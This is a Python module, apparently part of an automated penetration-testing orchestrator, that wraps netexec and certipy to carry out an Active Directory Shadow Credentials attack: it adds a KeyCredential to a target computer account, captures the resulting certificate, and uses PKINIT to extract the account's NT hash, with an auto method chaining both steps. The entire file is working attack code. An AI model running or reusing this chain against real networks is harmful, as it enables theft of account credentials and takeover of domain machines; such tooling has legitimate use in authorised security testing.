import logging, re, shlex

from orchestrator.kali_tools_client import kali

logger = logging.getLogger("ad_shadow_creds")


class ShadowCredentials:
    async def add_keycredential(self, target: str, computer: str,
                                 username: str, password: str = "",
                                 hash: str = "", domain: str = "",
                                 dc_ip: str = "", timeout: int = 120) -> dict:
        """
        Add KeyCredential to a computer account (Shadow Credentials).
        target: DC IP or hostname
        computer: target computer account (e.g. DC01$)
        """
        auth = f"-u {shlex.quote(username)}"
        auth += f" -p {shlex.quote(password)}" if password else f" -H {shlex.quote(hash)}"
        args = f"ldap {target} {auth} -M shadow-credentials -o COMPUTER={computer}"
        if dc_ip:
            args += f" -o DC_IP={dc_ip}"
        if domain:
            args += f" -d {domain}"

        result = await kali.run("netexec", args, timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        cert_match = re.search(r"(?:Saved|certificate|Certificate).+?(\S+\.(?:pfx|pem|crt))", stdout, re.I)
        success = "successfully" in stdout.lower() or "saved" in stdout.lower() or cert_match is not None

        return {
            "success": success,
            "computer": computer,
            "certificate_path": cert_match.group(1) if cert_match else None,
            "output": stdout[:3000],
            "error": result.get("stderr", "")[:1000] if not success else "",
        }

    async def get_nthash_from_pfx(self, pfx_path: str, domain: str,
                                   dc_ip: str = "", timeout: int = 120) -> dict:
        """Authenticate with the PFX cert to get NT hash via PKINIT."""
        args = f"auth -pfx {pfx_path} -domain {domain}"
        if dc_ip:
            args += f" -dc-ip {dc_ip}"
        result = await kali.run("certipy", args, timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        hash_match = re.search(r"Got Hash for '(.+)':([a-f0-9]{32})", stdout)
        return {
            "success": hash_match is not None,
            "user": hash_match.group(1) if hash_match else None,
            "nt_hash": hash_match.group(2) if hash_match else None,
            "output": stdout[:3000],
            "error": result.get("stderr", "")[:1000] if not hash_match else "",
        }

    async def auto(self, target: str, computer: str,
                   username: str, password: str = "",
                   hash: str = "", domain: str = "",
                   dc_ip: str = "", timeout: int = 240) -> dict:
        results = {}
        add_result = await self.add_keycredential(
            target, computer, username, password=password,
            hash=hash, domain=domain, dc_ip=dc_ip, timeout=timeout)
        results["add_keycredential"] = add_result
        if add_result.get("certificate_path"):
            auth_result = await self.get_nthash_from_pfx(
                add_result["certificate_path"], domain, dc_ip=dc_ip, timeout=timeout)
            results["get_nthash"] = auth_result
        return results
